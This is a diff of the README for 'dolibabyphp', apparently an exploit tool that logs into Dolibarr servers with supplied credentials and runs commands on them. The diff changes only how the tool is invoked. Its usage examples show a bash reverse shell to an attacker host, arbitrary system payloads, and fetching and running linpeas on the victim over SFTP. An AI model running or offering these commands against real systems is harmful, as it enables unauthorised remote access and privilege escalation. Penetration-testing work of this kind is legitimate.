@@ -13,8 +13,7 @@ pip install dolibabyphp
 ## Usage
 
 ```txt
-Usage: python -m dolibabyphp [OPTIONS] TARGET_URL USERNAME PASSWORD COMMAND
-                             [ARGS]...
+Usage: dolibabyphp [OPTIONS] TARGET_URL USERNAME PASSWORD COMMAND [ARGS]...
 
   This exploit will log into the Dolibarr web server at the specified target URL
   with the provided username and password. After that it will attempt to create
@@ -34,7 +33,7 @@ Options:
   --proxy TEXT           Specify a proxy URL for use in all requests.
   -o, --output FILENAME  Specify a file path to output the results of the
                          payload to. Defaults to stdout.
-  --help                 Show this message and exit.
+  -h, --help             Show this message and exit.
 
 Commands:
   bash-reverse-shell     Spawns a bash shell on the victim machine and...
@@ -49,19 +48,23 @@ Commands:
 
 ```shell
 # Reverse shell with Bash
-python -m dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
+dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
 
 # Testing with a proxy
-python -m dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
+dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
 
 # SFTP linpeas to the target, execute it, and save the output to a file on the attacker machine.
-python -m dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
+dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
 ```
 
 ## Running from source
 
-In order to run the project from the source code, make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.
+In order to run the project from the source code, you can either use `rye run` or make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.
 
 ```shell
+# With rye
+rye run dolibabyphp
+
+# Without rye
 PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
 ```
